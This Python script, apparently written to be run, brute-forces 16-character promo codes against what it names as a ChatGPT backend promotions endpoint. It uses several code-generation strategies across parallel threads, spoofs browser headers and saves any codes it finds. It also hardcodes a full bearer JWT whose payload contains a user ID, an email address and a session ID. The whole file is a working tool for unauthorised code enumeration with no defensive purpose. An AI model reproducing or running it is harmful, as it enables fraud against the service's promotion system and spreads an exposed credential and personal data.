#!/usr/bin/env python3
"""
Rapid Promo Code Hunter - Ultra fast brute force with intelligent patterns
Focused on speed and efficiency
"""

import json
import time
import urllib.request
import urllib.error
import random
import string
import threading
from datetime import datetime
from queue import Queue
import concurrent.futures

# Configuration
API_URL = "https://chatgpt.com/backend-api/promotions/eligibility/"
TOKEN = "eyJhbGciOiJSUzI1NiIsImtpZCI6IjE5MzQ0ZTY1LWJiYzktNDRkMS1hOWQwLWY5NTdiMDc5YmQwZSIsInR5cCI6IkpXVCJ9.eyJhdWQiOlsiaHR0cHM6Ly9hcGkub3BlbmFpLmNvbS92MSJdLCJjbGllbnRfaWQiOiJhcHBfWDh6WTZ2VzJwUTl0UjNkRTduSzFqTDVnSCIsImV4cCI6MTc1NTQ3MjU1NiwiaHR0cHM6Ly9hcGkub3BlbmFpLmNvbS9hdXRoIjp7InVzZXJfaWQiOiJ1c2VyLVdhOGZqbXlTeEFON0p5aFNkSFEwUWFxcyJ9LCJodHRwczovL2FwaS5vcGVuYWkuY29tL3Byb2ZpbGUiOnsiZW1haWwiOiJsYWdhMjEzNEBnbWFpbC5jb20iLCJlbWFpbF92ZXJpZmllZCI6dHJ1ZX0sImlhdCI6MTc1NDYwODU1NSwiaXNzIjoiaHR0cHM6Ly9hdXRoLm9wZW5haS5jb20iLCJqdGkiOiIwZWY5NDc0Mi1mMjU0LTQxMWEtODQ1Yy1iYzdkNDVlNTQ4YjIiLCJuYmYiOjE3NTQ2MDg1NTUsInB3ZF9hdXRoX3RpbWUiOjE3NTQ2MDg1NTMwMTMsInNjcCI6WyJvcGVuaWQiLCJlbWFpbCIsInByb2ZpbGUiLCJvZmZsaW5lX2FjY2VzcyIsIm1vZGVsLnJlcXVlc3QiLCJtb2RlbC5yZWFkIiwib3JnYW5pemF0aW9uLnJlYWQiLCJvcmdhbml6YXRpb24ud3JpdGUiXSwic2Vzc2lvbl9pZCI6ImF1dGhzZXNzX0s3Z0V1bmhNOE1mbU83TGh1YVdiOGRYWiIsInN1YiI6Imdvb2dsZS1vYXV0aDJ8MTE3MTgwODE5MDAzMjg4MzcxODEwIn0.GrYZm_mrbmB9mQdOoTgtUNUJh3sKC9I9LBY7vVmwuqOYivuaSV-UjGBHbbP-CeeZg-v0XWPeVMaOxVoz_Kf64ahUIewsmWQW2h-J0kZQatqY4bgnrergURjdExwNWjhzArSKzbcW8DX6fQDE9s4XQ3c9XNLq8XlE6EJQmX5HrmJVYlm2bhDZ4WdrdRGIXivSbLJAWNOhHHnFAvrnnzp_LbqyLld7913BGloj4jA_ss4CeHTzJIKM6DklFv6wT0lvtCsCCkMcUeKAEcRCGuQN8K0pm3-jm_ADxQ0m_JQivLKLTi6eBvwCkN6adEEanGZSOQKpLSoRUf-qwI2lwIJSJEWb_F4Qv-9J6eEPFvlRGg3vvkV45EE2Gr86BVQ2LJ29eoLJlTlYXqG7Lfy5zz08Lc5V2DNwPj94trmIYjTi9K-3uOLpJxdbPSQxvjgmivCwzr-bWIi3F1Fc_MEbYy1QHgRmAo3ksPiYoEHbQHYxPOWRD7TcQfAwAo97i25RtPJ4TQ8xYc0LK4hMCIal6CsCdG6bc3eoYPuEGnT65FQwjuzd3zD6Kt0g2Is3P0hpBAE2yz-9UvusX6Za8pDH9DYme03KgR76XsZjxIYUG_dvEmMTQyh2iPMywmAff8kwNeFbK0wbUcmuuykSDpo02psB81EJEPrLAd5xP6qfaLG0aWw"

CODE_LENGTH = 16
CHARSET = string.ascii_uppercase + string.digits
DELAY = 0.2  # Faster delay
MAX_WORKERS = 3  # Number of parallel threads
BATCH_SIZE = 50  # Codes to generate in each batch

# Global statistics
stats = {
    'total_checked': 0,
    'valid_found': 0,
    'error_count': 0,
    'start_time': time.time()
}

valid_codes = []
checked_codes = set()
stats_lock = threading.Lock()


def check_code(code):
    """Check a single promo code"""
    url = API_URL + code
    
    req = urllib.request.Request(url)
    req.add_header('Authorization', f'Bearer {TOKEN}')
    req.add_header('Accept', 'application/json')
    req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0')
    req.add_header('Origin', 'https://chatgpt.com')
    req.add_header('Referer', 'https://chatgpt.com/')
    
    try:
        with urllib.request.urlopen(req, timeout=8) as response:
            data = response.read()
            result = json.loads(data)
            return result.get('is_eligible', False), None
    except Exception as e:
        return False, str(e)


def generate_targeted_codes(strategy="mixed"):
    """Generate codes using different strategies"""
    
    if strategy == "common_prefixes":
        # Common promo code prefixes
        prefixes = ["SAVE", "DISC", "PROM", "GIFT", "FREE", "COUP", "DEAL", "SPEC"]
        prefix = random.choice(prefixes)
        remaining = CODE_LENGTH - len(prefix)
        suffix = ''.join(random.choices(CHARSET, k=remaining))
        return prefix + suffix
    
    elif strategy == "year_patterns":
        # Include current year patterns
        patterns = ["2024", "2025", "24", "25"]
        pattern = random.choice(patterns)
        remaining = CODE_LENGTH - len(pattern)
        
        # Insert pattern at random position
        pos = random.randint(0, remaining)
        prefix = ''.join(random.choices(CHARSET, k=pos))
        suffix = ''.join(random.choices(CHARSET, k=remaining - pos))
        return prefix + pattern + suffix
    
    elif strategy == "sequential":
        # Try sequential variations around known codes
        base_chars = list("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")
        code = ""
        for _ in range(CODE_LENGTH):
            code += random.choice(base_chars)
        return code
    
    elif strategy == "balanced":
        # Balanced mix of letters and numbers
        letters = random.choices(string.ascii_uppercase, k=CODE_LENGTH//2)
        numbers = random.choices(string.digits, k=CODE_LENGTH//2)
        chars = letters + numbers
        random.shuffle(chars)
        return ''.join(chars)
    
    else:  # random
        return ''.join(random.choices(CHARSET, k=CODE_LENGTH))


def worker_thread(thread_id, strategies):
    """Worker thread for checking codes"""
    global stats, valid_codes, checked_codes
    
    local_checked = 0
    local_valid = 0
    local_errors = 0
    
    while True:
        try:
            # Generate batch of codes
            codes_to_check = []
            for _ in range(BATCH_SIZE):
                strategy = random.choice(strategies)
                code = generate_targeted_codes(strategy)
                
                with stats_lock:
                    if code not in checked_codes:
                        checked_codes.add(code)
                        codes_to_check.append((code, strategy))
            
            # Check each code in the batch
            for code, strategy in codes_to_check:
                is_valid, error = check_code(code)
                local_checked += 1
                
                if is_valid:
                    local_valid += 1
                    with stats_lock:
                        valid_codes.append(code)
                        print(f"\n🎉 [Thread-{thread_id}] FOUND VALID: {code} (strategy: {strategy})")
                        
                        # Save immediately
                        with open('rapid_valid_codes.txt', 'a') as f:
                            f.write(f"{code}\n")
                
                elif error:
                    local_errors += 1
                
                # Update global stats periodically
                if local_checked % 10 == 0:
                    with stats_lock:
                        stats['total_checked'] += 10
                        stats['valid_found'] = len(valid_codes)
                        stats['error_count'] += local_errors
                        local_errors = 0
                
                time.sleep(DELAY)
                
        except KeyboardInterrupt:
            break
        except Exception as e:
            print(f"Thread {thread_id} error: {e}")
            time.sleep(1)
    
    # Update final stats
    with stats_lock:
        stats['total_checked'] += local_checked % 10
        stats['valid_found'] = len(valid_codes)


def print_status():
    """Print current status"""
    while True:
        time.sleep(10)  # Update every 10 seconds
        
        with stats_lock:
            elapsed = time.time() - stats['start_time']
            rate = stats['total_checked'] / elapsed if elapsed > 0 else 0
            
            print(f"\n📊 STATUS UPDATE:")
            print(f"   Time: {elapsed:.1f}s | Checked: {stats['total_checked']} | Valid: {stats['valid_found']} | Rate: {rate:.1f}/s")
            print(f"   Errors: {stats['error_count']} | Unique checked: {len(checked_codes)}")
            
            if valid_codes:
                print(f"   🎊 Valid codes found: {valid_codes}")


def main():
    """Main rapid hunting function"""
    print("⚡ RAPID PROMO CODE HUNTER")
    print("=" * 50)
    print(f"Workers: {MAX_WORKERS} | Delay: {DELAY}s | Batch: {BATCH_SIZE}")
    print("Strategies: common_prefixes, year_patterns, sequential, balanced, random")
    print("=" * 50)
    
    # Define strategies to use
    strategies = ["common_prefixes", "year_patterns", "sequential", "balanced", "random"]
    
    # Start status printer thread
    status_thread = threading.Thread(target=print_status, daemon=True)
    status_thread.start()
    
    # Start worker threads
    threads = []
    for i in range(MAX_WORKERS):
        t = threading.Thread(target=worker_thread, args=(i+1, strategies))
        t.daemon = True
        t.start()
        threads.append(t)
        print(f"🚀 Started worker thread {i+1}")
    
    try:
        # Keep main thread alive
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n\n⏹️  Rapid hunt stopped by user")
        
        # Final stats
        elapsed = time.time() - stats['start_time']
        rate = stats['total_checked'] / elapsed if elapsed > 0 else 0
        
        print(f"\n📈 FINAL STATISTICS:")
        print(f"   Time elapsed: {elapsed:.1f}s")
        print(f"   Total checked: {stats['total_checked']}")
        print(f"   Valid found: {stats['valid_found']}")
        print(f"   Error count: {stats['error_count']}")
        print(f"   Average rate: {rate:.2f} codes/second")
        print(f"   Unique codes checked: {len(checked_codes)}")
        
        if valid_codes:
            print(f"\n🏆 VALID CODES DISCOVERED:")
            for i, code in enumerate(valid_codes, 1):
                print(f"   {i}. {code}")
            print(f"\n💾 Saved to: rapid_valid_codes.txt")
        else:
            print(f"\n😔 No valid codes found this session")


if __name__ == "__main__":
    main()
